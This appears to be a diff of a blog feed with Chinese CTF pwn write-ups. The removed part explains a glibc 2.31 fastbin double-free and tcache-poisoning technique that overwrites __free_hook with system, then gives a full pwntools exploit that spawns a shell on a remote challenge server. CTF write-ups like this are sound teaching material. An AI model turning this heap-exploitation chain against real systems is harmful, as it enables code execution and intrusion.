-</code></pre></div></div> <h5 id="glibc版本231所以没办法打最原始的tcache-double-free-以及-poisoning因为从ubuntu2004也就是glibc231之前某个版本好像228就有对tcache-double-free的检查针对这个double-free的检查可以通过uaf修改tcache-chunk中的key值或者通过堆溢出改tcache-chunk的大小绕过检查但显然这个题都没有那么还有一种不那么常见的方法虽然glibc231有针对tcache-double-free的检查但是没有对于fastbin的double-free的检查虽然这么说但实际上还是有一些防范措施首先chunk接入fastbin时会检查fastbin栈顶的chunk如果一样就会被检查出来会报fastbin的double-free其次chunk接入fastbin时会在tcache-bin中检查如果发现存在一样则会报tcache-bin的double-free由于此题没用calloc所以malloc时会先从tcache-bin中取出chunk然后把fastbin中的一个chunk挪到tcache-bin中这个挪的过程中不存在double-free的检查所以这个题还是可以打一个tcache-poisoning以及__free_hook首先考虑泄露一下libc这里选择tcache-poisoning以及堆风水技巧将某个控制信息的chunk劫持到free的got表项上然后show出来即可注意到想修改text还需要先覆盖到next为了让链表正确地顺序寻址这个题还需要泄露heap-base">   glibc版本2.31,所以没办法打最原始的<code class="language-plaintext highlighter-rouge">tcache double free</code> 以及 <code class="language-plaintext highlighter-rouge">poisoning</code>，因为从Ubuntu20.04（也就是glibc2.31之前某个版本，好像2.28）就有对<code class="language-plaintext highlighter-rouge">tcache double free</code>的检查。<br/>   针对这个<code class="language-plaintext highlighter-rouge">double free</code>的检查，可以通过UAF修改<code class="language-plaintext highlighter-rouge">tcache chunk</code>中的<code class="language-plaintext highlighter-rouge">key</code>值，或者通过堆溢出改<code class="language-plaintext highlighter-rouge">tcache chunk</code>的大小绕过检查，但显然这个题都没有。<br/>   那么还有一种不那么常见的方法，虽然glibc2.31有针对<code class="language-plaintext highlighter-rouge">tcache double free</code>的检查，但是没有对于<code class="language-plaintext highlighter-rouge">fastbin</code>的<code class="language-plaintext highlighter-rouge">double free</code>的检查。虽然这么说，但实际上还是有一些防范措施。首先<code class="language-plaintext highlighter-rouge">chunk</code>接入<code class="language-plaintext highlighter-rouge">fastbin</code>时会检查<code class="language-plaintext highlighter-rouge">fastbin</code>栈顶的<code class="language-plaintext highlighter-rouge">chunk</code>，如果一样就会被检查出来会报<code class="language-plaintext highlighter-rouge">fastbin的double free</code>；其次，<code class="language-plaintext highlighter-rouge">chunk</code>接入<code class="language-plaintext highlighter-rouge">fastbin时</code>会在<code class="language-plaintext highlighter-rouge">tcache bin</code>中检查，如果发现存在一样则会报<code class="language-plaintext highlighter-rouge">tcache bin的double free</code>。<br/>   由于此题没用<code class="language-plaintext highlighter-rouge">calloc()</code>，所以<code class="language-plaintext highlighter-rouge">malloc()</code>时会先从<code class="language-plaintext highlighter-rouge">tcache bin</code>中取出<code class="language-plaintext highlighter-rouge">chunk</code>，然后把<code class="language-plaintext highlighter-rouge">fastbin</code>中的一个<code class="language-plaintext highlighter-rouge">chunk</code>挪到<code class="language-plaintext highlighter-rouge">tcache bin</code>中，这个挪的过程中不存在<code class="language-plaintext highlighter-rouge">double free</code>的检查，所以这个题还是可以打一个<code class="language-plaintext highlighter-rouge">tcache poisoning</code>以及<code class="language-plaintext highlighter-rouge">__free_hook</code>。<br/>   首先考虑泄露一下libc，这里选择<code class="language-plaintext highlighter-rouge">tcache poisoning</code>以及<code class="language-plaintext highlighter-rouge">堆风水</code>技巧将某个控制信息的chunk劫持到<code class="language-plaintext highlighter-rouge">free()</code>的got表项上，然后show出来即可。<br/>   注意到，想修改<code class="language-plaintext highlighter-rouge">*text</code>，还需要先覆盖到<code class="language-plaintext highlighter-rouge">*next</code>，为了让链表正确地顺序寻址，这个题还需要泄露<code class="language-plaintext highlighter-rouge">heap base</code>。<br/></h5> <h5 id="得到libc基址之后就是愉快地tcache-poisoning以及__free_hook了">   得到libc基址之后，就是愉快地<code class="language-plaintext highlighter-rouge">tcache poisoning</code>以及<code class="language-plaintext highlighter-rouge">__free_hook</code>了。<br/></h5> <h5 id="完整exp">   完整exp</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">from</span> <span class="n">os</span> <span class="kn">import</span> <span class="n">system</span>
-<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">cmd</span><span class="o">=</span><span class="sh">''</span><span class="p">):</span>
-    <span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">gdb --pi={}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">pid</span><span class="p">))</span>
-    <span class="nf">pause</span><span class="p">()</span>
-<span class="n">se</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>           <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>           <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">endstr</span><span class="p">,</span> <span class="n">data</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">endstr</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
-<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">endstr</span><span class="p">,</span> <span class="n">data</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">endstr</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
-<span class="n">rc</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>       <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
-<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
-<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">endstr</span>         <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">endstr</span><span class="p">)</span>
-<span class="n">info</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">tag</span><span class="p">,</span> <span class="n">addr</span>         <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="n">tag</span> <span class="o">+</span> <span class="sh">'</span><span class="s">: {:#x}</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
-<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\0</span><span class="sh">'</span><span class="p">))</span>
-<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\0</span><span class="sh">'</span><span class="p">))</span>
-
-<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
-<span class="c1"># io = process("./pwn")
-</span><span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">152.136.11.155</span><span class="sh">"</span><span class="p">,</span><span class="mi">30871</span><span class="p">)</span>
-<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./pwn</span><span class="sh">"</span><span class="p">)</span>
-<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./libc-2.31.so</span><span class="sh">"</span><span class="p">)</span>
-
-<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
-    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">0.Exit.</span><span class="se">\n</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
-    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Size?</span><span class="se">\n</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
-    <span class="k">if</span> <span class="n">context</span> <span class="o">!=</span> <span class="sa">b</span><span class="sh">''</span><span class="p">:</span>  
-        <span class="nf">sa</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Content?</span><span class="se">\n</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
-    <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
-
-<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span> <span class="c1"># from 1 to ...
-</span>    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">0.Exit.</span><span class="se">\n</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
-    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">ord?</span><span class="se">\n</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
-    <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
-
-<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
-    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">0.Exit.</span><span class="se">\n</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
-    <span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">ord?</span><span class="se">\n</span><span class="s">&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
-    <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
-
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
-    <span class="nf">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># 1~9
-</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">8</span><span class="p">):</span>
-    <span class="nf">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-<span class="nf">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
-<span class="nf">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># 10
-</span><span class="nf">show</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
-<span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">10:</span><span class="sh">'</span><span class="p">)</span>
-<span class="n">heap_base</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">rc</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x361</span>
-<span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">heap_base</span><span class="sh">"</span><span class="p">,</span> <span class="n">heap_base</span><span class="p">)</span>
-<span class="n">offset1</span> <span class="o">=</span> <span class="mi">10</span>
-
-<span class="c1"># leak libc
-</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">12</span><span class="p">):</span>
-    <span class="nf">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">d</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># 1~11
-</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span> <span class="o">+</span> <span class="n">offset1</span><span class="p">,</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">offset1</span><span class="p">):</span>
-    <span class="nf">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="c1"># fill tcache
-</span>
-<span class="nf">free</span><span class="p">(</span><span class="mi">8</span> <span class="o">+</span> <span class="n">offset1</span><span class="p">)</span>
-<span class="nf">free</span><span class="p">(</span><span class="mi">9</span> <span class="o">+</span> <span class="n">offset1</span><span class="p">)</span>
-<span class="nf">free</span><span class="p">(</span><span class="mi">10</span> <span class="o">+</span> <span class="n">offset1</span><span class="p">)</span>
-<span class="nf">free</span><span class="p">(</span><span class="mi">8</span> <span class="o">+</span> <span class="n">offset1</span><span class="p">)</span> <span class="c1"># fastbin 0x20: 8-&gt;10-&gt;9-&gt;8
-</span><span class="nf">free</span><span class="p">(</span><span class="mi">11</span> <span class="o">+</span> <span class="n">offset1</span><span class="p">)</span> <span class="c1"># to deplete tcache
-</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
-    <span class="nf">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">b</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># 12~15 to deplete
-</span>
-<span class="nf">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">c</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># 17
-</span><span class="nf">add</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">17</span> <span class="o">+</span> <span class="n">offset1</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x6a0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">free</span><span class="sh">'</span><span class="p">]))</span> <span class="c1"># 18
-</span><span class="nf">show</span><span class="p">(</span><span class="mi">17</span> <span class="o">+</span> <span class="n">offset1</span><span class="p">)</span>
-<span class="nf">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-<span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">)</span>
-<span class="n">free_</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">rc</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
-<span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">_free</span><span class="sh">"</span><span class="p">,</span> <span class="n">free_</span><span class="p">)</span>
-
-<span class="c1"># system
-</span><span class="n">libc_base</span> <span class="o">=</span> <span class="n">free_</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">free</span><span class="sh">"</span><span class="p">]</span>
-<span class="n">system_</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">]</span>
-<span class="n">__free_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">"</span><span class="s">__free_hook</span><span class="sh">"</span><span class="p">]</span>
-
-<span class="n">offset2</span> <span class="o">=</span> <span class="mi">28</span>
-
-<span class="c1"># tcache poisioning
-</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
-    <span class="nf">add</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span>
-
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
-    <span class="nf">free</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">offset2</span><span class="p">)</span> <span class="c1"># tcache
-</span>
-<span class="nf">free</span><span class="p">(</span><span class="mi">8</span> <span class="o">+</span> <span class="n">offset2</span><span class="p">)</span>
-<span class="nf">free</span><span class="p">(</span><span class="mi">9</span> <span class="o">+</span> <span class="n">offset2</span><span class="p">)</span>
-<span class="nf">free</span><span class="p">(</span><span class="mi">8</span> <span class="o">+</span> <span class="n">offset2</span><span class="p">)</span>
-
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
-    <span class="nf">add</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># offset2 + 10 
-</span><span class="nf">add</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="n">__free_hook</span><span class="p">))</span>
-<span class="nf">add</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span>
-<span class="nf">add</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">aa</span><span class="sh">'</span><span class="p">)</span>
-<span class="nf">add</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="n">system_</span><span class="p">))</span>
-
-<span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">__free_hook</span><span class="sh">"</span><span class="p">,</span> <span class="n">__free_hook</span><span class="p">)</span>
-<span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">,</span> <span class="n">system_</span><span class="p">)</span>
-<span class="nf">add</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
-<span class="nf">free</span><span class="p">(</span><span class="mh">0x32</span><span class="p">)</span>
-<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
-</code></pre></div></div>]]></content><author><name>久菜合子</name></author><category term="CTF"/><category term="pwn"/><summary type="html"><![CDATA[前排提示：1.一些题目没exp       2.由于题目不是一次上完的，所以顺序上可能不完全与当时一致     3.附件在GitHub仓库里有 💓 引导之始(🍼Baby) ```md ⚠ 题目描述 即使引导早已破碎，也请您当上PWN高手。]]></summary></entry></feed>
+</code></pre></div></div> <h5 id="第二种方法是出题人迪普朋克提示的但没有想到怎么实现puts和system在libc中的偏移有16进制下的五位之多由于无法泄露libc基址异或最多修改三位所以不知道具体怎么写">   第二种方法是出题人迪普朋克提示的，但没有想到怎么实现，<code class="language-plaintext highlighter-rouge">puts</code>和<code class="language-plaintext highlighter-rouge">system()</code>在libc中的偏移有16进制下的五位之多，由于无法泄露libc基址，异或最多修改三位，所以不知道具体怎么写。</h5> <h5 id="补几天之后打通了远程发现是nc远程启动的进程和docker容器内本地启动的进程内存布局不一样mmap分配的空间的位置不一样把上面exp的地址改一下就可以">   补：几天之后打通了远程，发现是nc远程启动的进程和docker容器内本地启动的进程内存布局不一样，<code class="language-plaintext highlighter-rouge">mmap()</code>分配的空间的位置不一样，把上面exp的地址改一下就可以。</h5>]]></content><author><name>久菜合子</name></author><category term="CTF"/><category term="pwn"/><summary type="html"><![CDATA[参考资料： 实例文件为boss题的attachment，见github https://zhuanlan.zhihu.com/p/37572651 https://ctf-wiki.org/executable/elf/structure/basic-info/ https://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/ https://www.soinside.com/question/AENBEApAgMMbfzPviVeoBc]]></summary></entry></feed>
